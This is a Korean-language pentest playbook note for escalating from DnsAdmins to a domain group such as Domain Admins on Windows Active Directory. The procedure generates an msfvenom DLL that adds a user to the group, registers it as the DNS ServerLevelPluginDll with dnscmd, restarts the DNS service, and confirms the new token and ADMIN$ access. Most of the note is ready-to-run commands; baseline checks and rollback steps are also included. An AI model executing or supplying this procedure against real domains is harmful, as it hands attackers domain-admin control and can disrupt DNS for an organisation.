---
tags:
  - 환경/ad
  - 서비스/dns
시작조건: ["DnsAdmins 그룹이 현재 Windows token에 반영된 세션 확보", "관리 대상 Windows DNS 서버 식별"]
필요권한: ["대상 DNS 서버의 DnsAdmins 권한", "DNS 서비스 재시작은 별도의 SERVICE_STOP·SERVICE_START 권한"]
필요조건: ["대상 DNS 서버에서 읽을 수 있는 DNS plug-in DLL의 절대 경로", "dnscmd RPC 관리 경로", "기존 plug-in 값·서비스 상태·대상 그룹 구성원 기준선"]
결과: ["DNS plug-in DLL이 수행한 그룹 멤버십 변경", "새 Windows 로그온 access token과 대상 SMB 인가 결과", "플러그인 설정만 성공하고 실행은 미확인인 중간 상태"]
---

# DnsAdmins DNS 서버 플러그인 DLL 실행

## 한 줄 판단

현재 Windows access token에 DnsAdmins 멤버십이 반영되고 대상 Windows DNS 서버가 읽을 수 있는 plug-in DLL을 준비했다면, `ServerLevelPluginDll`을 기준선과 함께 변경하고 별도 서비스 제어 권한이 있을 때만 DNS를 재시작하여 DLL의 그룹 멤버십 변경 명령, 새 Windows 로그온 access token과 대상 SMB 인가 결과를 확인한다.

> DNS 서비스 재시작은 기존 DNS 질의와 도메인 서비스에 영향을 줄 수 있으므로 기존 plug-in 값과 서비스 상태를 기록하고, start 실패 시 즉시 원복한다. DLL이 그룹 멤버십을 바꾸면 기존 Windows 로그온 access token은 그대로 남으므로 이번에 추가한 정확한 계정만 복구하고 새 Windows 로그온 token과 대상 SMB 인가 결과를 별도로 확인한다.

## 전제 조건

| 확인할 것 | 필요한 상태 | 확인 방법 | 미충족 시 다음 확인 |
|---|---|---|---|
| 실행 위치와 관리 경로 | Windows 관리 호스트에서 대상 DNS 서버 RPC 관리 가능 | `dnscmd <DNS_SERVER> /info`의 응답과 대상명 확인 | DNS 이름 해석, RPC·방화벽과 실행 호스트를 확인 |
| 현재 계정 | DnsAdmins SID가 현재 token에 반영됨 | `whoami /groups`와 `Get-ADGroupMember DnsAdmins` 결과를 분리해 확인 | 그룹 변경 직후라면 새 로그온 token을 만든 뒤 재확인 |
| 설정 권한 | 대상 서버의 `ServerLevelPluginDll` 조회·변경 가능 | `/info /serverlevelplugindll`과 변경 명령 결과 | 일반 DNS record 쓰기와 server-level config 권한을 구분 |
| DLL 입력 | DNS 서버의 service account가 읽을 수 있는 절대 local 또는 UNC 경로의 DLL | exact path와 ACL | 상대 경로·공격 호스트의 로컬 경로를 대상 경로로 착각하지 않음 |
| 서비스 제어 | 별도의 DNS stop/start 권한 | `sc.exe \\<DNS_SERVER> sdshow DNS` | 권한이 없으면 설정만으로 실행 성공을 주장하지 말고 즉시 원복 |
| 복구 기준선 | 기존 plug-in 값, 서비스 상태와 DNS 기준 질의 기록 | `dnscmd /info`, `sc query`, 기준 이름의 `nslookup` | 기존 값이 있으면 덮어쓰기 전에 중단하고 복구 경로를 준비 |

`DnsAdmins`는 AD 그룹 상태이고 `ServerLevelPluginDll` 설정, 서비스 재시작, DLL 실행은 서로 다른 단계다. DLL 경로 설정 성공만으로 load나 명령 실행을 뜻하지 않는다.

## 실행

### 1. 현재 token과 기존 DNS 설정 기록

```cmd
whoami /groups | findstr /i "DnsAdmins"
dnscmd <DNS_SERVER> /info /serverlevelplugindll
sc.exe \\<DNS_SERVER> query DNS
nslookup <BASELINE_NAME> <DNS_SERVER>
```

확인할 출력:

- DnsAdmins가 디렉터리 그룹 목록뿐 아니라 현재 token에 표시되는지 확인한다.
- 기존 `ServerLevelPluginDll` 값이 비어 있는지 또는 기존 plug-in이 있는지 기록한다.
- `STATE : 4 RUNNING`과 기준 DNS 응답을 저장한다. 설정 조회 성공은 DLL 실행이 아니다.

### 2. plug-in DLL 생성·반입과 경로 확인

`<ABSOLUTE_PLUGIN_DLL_PATH>`는 DNS 서버가 읽는 DLL의 절대 local 또는 UNC 경로다. `<TEST_USER>`는 DLL이 추가할 도메인 계정, `<TARGET_DOMAIN_GROUP>`은 그 계정을 추가할 도메인 그룹(예: `Domain Admins`)이다. 둘은 DLL을 build하는 Linux 호스트의 계정이 아니다. DLL의 build·entry point·Code Integrity 적합성은 이 정적 문서만으로 확인하지 않으며, service start 실패를 load 성공으로 해석하지 않는다.

Linux build host에서 `<PLUGIN_DLL>`이 없고, DNS 서버 또는 UNC를 관리하는 Windows 세션에서 `<ABSOLUTE_PLUGIN_DLL_PATH>`가 없음을 각각 확인한다. 둘 중 하나라도 이미 존재하면 이름을 바꾸며, 이번 실행 전에 존재한 파일은 덮어쓰거나 복구 단계에서 삭제하지 않는다.

```bash
test ! -e '<PLUGIN_DLL>'
```

```powershell
Test-Path -LiteralPath '<ABSOLUTE_PLUGIN_DLL_PATH>'
```

첫 명령은 성공하고 `Test-Path`는 `False`여야 새 파일 두 개의 소유권을 이번 실행으로 한정할 수 있다.

대상 그룹의 기존 구성원에 `<TEST_USER>`가 없음을 먼저 확인한다. 이미 구성원이면 이 절차로 추가·제거하지 않는다.

```powershell
Get-ADGroupMember -Identity '<TARGET_DOMAIN_GROUP>' |
  Where-Object SamAccountName -eq '<TEST_USER>'
```

Linux build host에서는 `<PLUGIN_DLL>`에 DNS service가 실행할 DLL을 생성한다. `<PLUGIN_DLL>`은 build host의 새 출력 경로(예: `/tmp/dns-plugin.dll`)이고, 대상 DNS 서버가 읽는 `<ABSOLUTE_PLUGIN_DLL_PATH>`와는 역할이 다르다.

```bash
msfvenom -p windows/x64/exec cmd='net group "<TARGET_DOMAIN_GROUP>" "<TEST_USER>" /add /domain' -f dll -o '<PLUGIN_DLL>'
```

생성한 `<PLUGIN_DLL>`은 [[상황별 파일 전송]]에서 현재 네트워크 경로와 실행 호스트에 맞는 방법으로 DNS 서버의 `<ABSOLUTE_PLUGIN_DLL_PATH>`에 반입한다. local 경로이면 DNS 서버 세션에서, UNC 경로이면 그 UNC를 실제로 해석하는 관리 세션에서 다음 ACL 확인을 실행한다.

```powershell
Get-Acl -LiteralPath '<ABSOLUTE_PLUGIN_DLL_PATH>' | Format-List Owner,AccessToString
```

반입 뒤에는 DNS service account의 READ ACL과 exact 경로를 확인하며, 파일이 존재한다는 사실만으로 DLL load를 판정하지 않는다.

```cmd
dnscmd <DNS_SERVER> /config /serverlevelplugindll <ABSOLUTE_PLUGIN_DLL_PATH>
dnscmd <DNS_SERVER> /info /serverlevelplugindll
```

확인할 출력:

- `Registry property serverlevelplugindll successfully reset`와 설정한 exact 경로.
- 이 시점의 결과는 다음 service start 때 load할 경로가 설정된 상태다. DLL load와 명령 실행은 별도로 확인한다.

### 3. DNS 서비스를 재시작하고 DLL load 상태 확인

서비스 DACL에 현재 SID의 stop/start 권한이 있을 때만 실행한다.

```cmd
sc.exe \\<DNS_SERVER> stop DNS
sc.exe \\<DNS_SERVER> start DNS
sc.exe \\<DNS_SERVER> query DNS
```

```powershell
Get-ADGroupMember -Identity '<TARGET_DOMAIN_GROUP>' |
  Where-Object SamAccountName -eq '<TEST_USER>'
```

확인할 출력:

- DNS 서비스가 `RUNNING`으로 복귀했는지 확인한다.
- service start와 기준 DNS 응답은 서비스 복귀만 뜻한다.
- `<TEST_USER>`가 `<TARGET_DOMAIN_GROUP>`의 새 구성원으로 표시되면 DLL의 명령 실행에 따른 directory membership 변경을 확인한 상태다. 이 결과만으로 DLL 실행 Identity가 SYSTEM이라고 확정하지 않는다. 표시되지 않으면 DLL load·명령 실행을 확인하지 못한 상태로 둔다.
- 서비스 start 실패는 plug-in ABI·architecture·경로·ACL·Code Integrity 문제일 수 있다. DNS를 반복 재시작하지 말고 즉시 복구 단계로 이동한다.

### 4. 새 로그온 token과 대상 접근 확인

그룹 변경이 확인된 경우에만 `<TEST_USER>`의 기존 Windows 세션에서 로그오프한다.

```cmd
shutdown /l
```

같은 `<TEST_USER>`로 새 로그인한 뒤 로컬 Windows access token과 `<ACCESS_TARGET>`의 관리 share를 확인한다. `<ACCESS_TARGET>`은 대상 Windows 호스트의 FQDN 또는 hostname이며 가상 예시는 `fileserver.example.test`다. `whoami /groups`는 새 로그온의 로컬 access token을, `dir \\<ACCESS_TARGET>\ADMIN$`는 그 요청의 인증 컨텍스트에 대한 대상 SMB server-side 인가 결과를 각각 판정한다.

```cmd
whoami /all
whoami /groups | findstr /i "<TARGET_DOMAIN_GROUP>"
dir \\<ACCESS_TARGET>\ADMIN$
```

확인할 출력:

- `whoami /all`의 사용자 SID가 `<TEST_USER>`이고 `<TARGET_DOMAIN_GROUP>` SID가 enabled group으로 표시된다.
- `dir` 성공은 새 token으로 해당 SMB administrative share를 읽은 결과다. 그룹 멤버십이나 share 접근 하나만으로 DCSync·WinRM·다른 호스트 권한을 확정하지 않는다.

## 관찰과 상태 전환

| 관찰 | 판단 | 결과 상태 | 다음 행동 |
|---|---|---|---|
| 설정 명령만 성공 | plug-in 경로 변경 성공 | 서비스 계정 실행 미확인 | 재시작 권한이 없으면 즉시 원래 값으로 복구 |
| DNS가 재시작되나 membership 기준선이 그대로임 | 서비스 재시작 성공 | DLL 실행 미확인 | DLL ABI·architecture·ACL·Code Integrity와 service event를 확인하고 원복 |
| `<TEST_USER>`가 대상 그룹에 새로 표시됨 | DLL 명령 실행 후 directory membership 변경 확인 | 실행 Identity와 새 token 미확인 | 같은 사용자로 새 로그인 |
| 새 access token에 그룹 SID와 `ADMIN$` 접근이 확인됨 | membership, 새 로그온의 로컬 token과 대상 SMB 인가 결과를 분리해 확인 | `<TEST_USER>`의 새 Windows 로그온 access token과 대상 SMB authorization | 필요한 후속 판단 뒤 즉시 복구 |
| `ERROR_ACCESS_DENIED` | 현재 token에 필요한 DnsAdmins 또는 server config 권한 없음 | 설정 실패 | 그룹 디렉터리 상태, 새 token과 대상 서버를 확인 |
| DNS start 실패 | plug-in load 또는 서비스 초기화 실패 | DNS 서비스 영향 발생 | 다른 시도보다 `ServerLevelPluginDll` 원복과 정상 질의를 우선 |
| DNS는 실행되나 DLL load 결과를 확인할 수 없음 | DLL 경로·entry point·architecture·ACL 또는 정책 미충족 | 명령 실행 미확인 | 서비스 event log와 Code Integrity 오류를 확인하고 성공으로 기록하지 않음 |

## 변경 영향과 복구

기존 값이 없었던 경우에는 DLL 경로를 생략해 custom plug-in 사용을 해제한다. 기존 값이 있었으면 기록한 exact 원래 경로로 되돌린다.

```cmd
dnscmd <DNS_SERVER> /config /serverlevelplugindll
```

또는 기존 값이 있었던 경우:

```cmd
dnscmd <DNS_SERVER> /config /serverlevelplugindll <ORIGINAL_PLUGIN_DLL_PATH>
```

DNS를 다시 시작한 뒤 상태와 기준 이름 해석을 확인한다.

```cmd
sc.exe \\<DNS_SERVER> stop DNS
sc.exe \\<DNS_SERVER> start DNS
sc.exe \\<DNS_SERVER> query DNS
nslookup <BASELINE_NAME> <DNS_SERVER>
dnscmd <DNS_SERVER> /info /serverlevelplugindll
```

이번 DLL이 추가한 exact membership만 제거한다. 기존 구성원이거나 다른 동시 변경은 제거하지 않는다.

```cmd
net group "<TARGET_DOMAIN_GROUP>" "<TEST_USER>" /delete /domain
```

```powershell
Get-ADGroupMember -Identity '<TARGET_DOMAIN_GROUP>' |
  Where-Object SamAccountName -eq '<TEST_USER>'
```

membership이 사라져도 이미 만든 token은 자동으로 바뀌지 않는다. `<TEST_USER>`의 새 로그온을 종료하고 다시 로그인한 뒤 `whoami /groups`에서 그룹 SID가 사라진 것과 `<ACCESS_TARGET>` 접근이 더 이상 허용되지 않는지를 별도로 확인한다. 이를 확인하지 못하면 token 영향 복구는 미확인으로 남긴다.

DNS 서버 반입본 `<ABSOLUTE_PLUGIN_DLL_PATH>`는 서비스가 더 이상 참조하지 않고 실행 전 `Test-Path`가 `False`였음을 확인한 뒤 해당 서버 또는 UNC를 관리하는 Windows 세션에서만 삭제한다.

```powershell
Remove-Item -LiteralPath '<ABSOLUTE_PLUGIN_DLL_PATH>' -Force
Test-Path -LiteralPath '<ABSOLUTE_PLUGIN_DLL_PATH>'
```

Linux build 산출물 `<PLUGIN_DLL>`은 별도 파일이므로 실행 전 부재가 확인된 경우에만 build host에서 정확한 경로를 정리한다.

```bash
rm -- '<PLUGIN_DLL>'
test ! -e '<PLUGIN_DLL>'
```

두 부재 확인이 성공해야 생성 파일 정리가 끝난 것이다. 로그, DNS 중단, 이미 노출된 자료와 별도로 발급된 Kerberos ticket은 plug-in 설정 복구만으로 되돌릴 수 없다.

## 관련 서비스

- [[DNS 서비스]]

## 관련 도구

- [[dnscmd]]
- [[powershell]]
- [[msfvenom]]

## 관련 공격기법

- [[상황별 파일 전송]]

## 관련 상태 라우터

- [[AD Identity 확인 후 도메인 컨텍스트 열거]]
- [[Windows 위임 운영 그룹 확인 후 권한 경로 선택]]
- [[Windows 셸 또는 세션 확보 후 컨텍스트 열거]]
- [[고권한 세션 확보 후 후속 판단]]

## 참고 링크

- [Microsoft Learn: DnsAdmins](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#dnsadmins)
- [Microsoft Learn: dnscmd](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/dnscmd)
- [Microsoft Open Specifications: ServerLevelPluginDll](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dnsp/c9d38538-8827-44e6-aa5e-022a016ed723)
